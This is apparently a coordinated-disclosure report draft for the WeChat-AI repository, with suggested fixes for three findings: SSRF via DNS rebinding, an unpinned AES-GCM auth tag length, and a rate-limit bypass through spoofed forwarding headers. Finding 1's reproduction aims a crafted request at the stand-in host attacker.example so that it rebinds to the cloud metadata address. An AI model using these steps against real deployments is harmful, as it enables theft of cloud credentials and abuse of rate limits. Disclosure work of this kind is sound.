# Private Vulnerability Report — SMNETSTUDIO/WeChat-AI

**Repo:** https://github.com/SMNETSTUDIO/WeChat-AI
**HEAD scanned:** `1f56c7f77623d0223164fb3ce97b0f2e48f6ca6f` (2026-08-13)
**Scanned by:** Aeon (semgrep 1.173.0 + manual review of high-risk surfaces)
**Drafted:** 2026-08-15T16:30:00Z — hold for operator submission (do not publish publicly)
**Channel:** GitHub PVR (advisory endpoint enabled; SECURITY.md declares 48h ACK SLA)

## How to submit (operator)

```bash
gh api -X POST /repos/SMNETSTUDIO/WeChat-AI/security-advisories \
  -H "X-GitHub-Api-Version: 2026-03-10" \
  -f summary="<title from one of the 3 findings below — one advisory per finding>" \
  -f description="<paste the finding body below>" \
  -f severity="<medium|low>" \
  -F cwe_ids='[...]'
```

Recommended: **file three separate advisories** (each finding has a distinct fix path and severity). If bundling, use severity of the highest (MEDIUM).

---

## Finding 1 — SSRF via DNS rebinding in HF tools upstream guard

**Severity:** MEDIUM
**CWE:** CWE-918 (SSRF), CWE-367 (TOCTOU)
**Location:** `huggingface/wechat-ai-tools/services/security.py:39-72` + `services/upstream_llm.py:110-111`

### Summary
The HF tools gateway lets users route chat completions through an arbitrary `upstream.base_url` (via `ALLOW_REQUEST_UPSTREAM=true`, on by default). `validate_upstream_base_url()` calls `socket.getaddrinfo()` and rejects the URL if the resolved IP is private, loopback, link-local, etc. It then returns the **URL string**, and `httpx.AsyncClient` re-resolves the hostname when making the request. An attacker who controls DNS for their hostname can return a public IP for the validation query and a private IP (e.g. `169.254.169.254`, `127.0.0.1`, RFC-1918) for the actual httpx request — bypassing the guard.

### Impact
- Any legitimate main-site user with a "custom LLM" configured (or anyone who has stolen `TOOLS_API_KEY`) can trigger an outbound request from the HF Spaces / Docker gateway host to arbitrary internal targets on the gateway's egress path.
- On HF Spaces, this exposes the Spaces internal network; on cloud VMs it exposes the metadata service (`169.254.169.254` AWS/GCP, `100.100.100.200` Alibaba) which typically leaks IAM credentials or SSH keys.
- The gateway forwards the response body to the caller, so the attacker gets the metadata response payload back.

### Reproduction
1. Deploy `huggingface/wechat-ai-tools` with defaults (`ALLOW_REQUEST_UPSTREAM=true`, `UPSTREAM_DENY_PRIVATE=true`) and a `TOOLS_API_KEY`.
2. Set up authoritative DNS for `attacker.example`:
   - First A response: `1.2.3.4` (public, passes `_is_private_ip` check)
   - Second A response: `169.254.169.254` (AWS metadata)
   - Short TTL (0–1s) so httpx doesn't reuse the first answer.
3. Send:
   ```
   POST /v1/chat/completions
   Authorization: Bearer <TOOLS_API_KEY>
   {
     "messages":[{"role":"user","content":"x"}],
     "model":"x",
     "upstream": {
       "base_url":"http://attacker.example",
       "api_key":"x",
       "model":"x"
     }
   }
   ```
4. `validate_upstream_base_url` resolves once (public IP) and passes.
5. `httpx.AsyncClient.post("http://attacker.example/chat/completions")` re-resolves and connects to `169.254.169.254`, then returns the response body to the caller.

### Suggested fix
Resolve DNS once inside `validate_upstream_base_url`, then perform the httpx request against the pinned IP (with the original hostname preserved as `Host` header for TLS SNI on `https://`). Minimum viable patch:

```python
# services/security.py
def validate_upstream_base_url(url: str, *, deny_private=True) -> tuple[str, str]:
    ...
    if deny_private:
        infos = socket.getaddrinfo(host, parsed.port or 443, type=socket.SOCK_STREAM)
        safe_ips = []
        for info in infos:
            ip = info[4][0]
            if _is_private_ip(ip):
                raise UnsafeUpstreamError(f"upstream resolves to blocked address: {host} -> {ip}")
            safe_ips.append(ip)
    return raw.rstrip("/"), safe_ips[0]
```

Then in `chat_completions`, use `httpx.AsyncHTTPTransport(local_address=None, ...)` with a custom `AsyncClient(transport=...)` that pins the resolved IP — or use `httpx.Client(transport=httpx.HTTPTransport(uds=None))` with an explicit `socket.gethostbyname` result and `Host` header. Simplest: use `httpx-socks` or a resolver hook. See https://www.python-httpx.org/advanced/#custom-transports for the transport pattern.

Alternative: run the DNS check **also** after connect (validate `resp.raw.connection.sock.getpeername()[0]` is not private).

Reference: OWASP SSRF Prevention Cheat Sheet, "DNS Rebinding".

---

## Finding 2 — AES-256-GCM decrypt without pinned `authTagLength`

**Severity:** LOW
**CWE:** CWE-310 (Cryptographic issues) / CWE-916
**Location:** `packages/db/src/secret-crypto.ts:72`

### Summary
`decryptSecret` calls `crypto.createDecipheriv("aes-256-gcm", key, iv)` without the `{ authTagLength: 16 }` option, then `decipher.setAuthTag(tag)` where `tag` is user-supplied (base64url-decoded from stored ciphertext). Node's `setAuthTag` accepts any tag length in 4–16 bytes when `authTagLength` is not pinned. `encryptSecret` on line 51 always calls `cipher.getAuthTag()` which emits 16 bytes, so pinning to 16 is fully backward-compatible with every legitimate stored ciphertext.

### Impact
Any attacker who can substitute a stored user-secret ciphertext blob in Redis (e.g. via a Redis-write compromise, or via any endpoint that lets a user write to another user's `settings.customApi.apiKey` field) can forge a decryption with a shortened auth tag — reducing GCM's forgery resistance from 2^128 to as low as 2^32. Combined with an oracle (e.g. an endpoint that reports "invalid ciphertext" vs. "decryption returned garbage"), this weakens the integrity guarantee of stored user LLM API keys.

Requires attacker write-access to the encrypted-blob storage. Real risk profile: **defense-in-depth**, not a standalone exploit.

### Suggested fix
```diff
- const decipher = createDecipheriv("aes-256-gcm", key, iv);
+ const decipher = createDecipheriv("aes-256-gcm", key, iv, { authTagLength: 16 });
```

Compat: `getAuthTag()` on the encrypt side always emits 16 bytes today, so pinning is a no-op for legitimate ciphertexts. Optionally reject `tag.length !== 16` before `setAuthTag` for an explicit error.

---

## Finding 3 — Rate-limit bypass via unconditional trust of `cf-connecting-ip` / `x-forwarded-for`

**Severity:** LOW (deployment-conditional; safe under recommended CF-fronted deployment)
**CWE:** CWE-345 (Insufficient Verification of Data Authenticity), CWE-807 (Reliance on Untrusted Inputs)
**Location:** `apps/api/src/routes.ts:324-331` (`clientIp()`), used at lines 740, 860, 908

### Summary
`clientIp()` reads `cf-connecting-ip` and `x-forwarded-for` from every request unconditionally, without any check that the request originated from Cloudflare's IP range or from a trusted proxy. `request-log.ts:97` states the intent — "trustProxy is deliberately off, so only Cloudflare's header is trusted" — but the code trusts the header from any source. Deployers who expose the API directly (bare-node deployments, dev environments, or CF misconfiguration where the Worker doesn't strip client-supplied `cf-connecting-ip`) let attackers set an arbitrary key on every rate-limiter call:

```ts
authRegisterLimiter.tryTake(`reg:${ip}`);
authLoginLimiter.tryTake(`login:${ip}`);
authInvitePeekLimiter.tryTake(`invpeek:${ip}`);
```

### Impact
Rotating `cf-connecting-ip: <random>` across requests defeats the per-IP rate limiter on:
- `POST /api/v1/auth/register` — flood account creation (mitigated for invite-required deployments)
- `POST /api/v1/auth/password-login` — the `loginu:$username` sub-limiter still caps per-user brute force, but IP-based limits are gone
- `GET /api/v1/auth/invite/:code` — enables invite-code enumeration

Impact hinges entirely on whether the deployer follows the documented CF-fronted architecture. Users who deploy a single node without CF (small self-hosters, dev/testing, users who "just want to run this in Docker on a VPS") are silently exposed.

### Suggested fix
Any one of:

1. **Gate CF-header trust on a config flag** — only read `cf-connecting-ip` when `TRUST_CF_HEADERS=1` is explicitly set:
   ```ts
   function clientIp(req: FastifyRequest): string {
     if (cfg.trustCfHeaders) {
       const cf = req.headers["cf-connecting-ip"];
       if (typeof cf === "string" && cf) return cf;
     }
     return req.ip || "unknown";
   }
   ```
2. **Verify request source** — check `req.socket.remoteAddress` against Cloudflare's published IP ranges (https://www.cloudflare.com/ips/) before trusting the header.
3. **Documentation gap fix at minimum**: `docs/runbook.md` should call out that bare-node deployments must NOT reach the API directly, or the rate limits are meaningless.

---

## Scanner sources (for your record)
- semgrep 1.173.0: 5 candidates → 1 confirmed (this Finding 2), 4 false-positive/design/test
- trufflehog 3.97.0 (fs + git): 0 verified secrets across full 200-commit history
- osv-scanner: 6 vulnerable packages / 23 advisories (see companion `-deps.md` file for the public-PR bundle)
- Manual review: OAuth flow, OTA apply, admin auth, sticker security, chatflow HTTP node — all defended well; the three findings above are the only issues surfaced.

## Disclosure timeline requested
- Standard 90-day coordinated disclosure; happy to extend if maintainer requests.
- Findings 1 (SSRF) and 2 (GCM tag) each merit a short GHSA release once patched.
- Finding 3 (rate-limit bypass) can be handled as a docs+config update; no CVE needed.
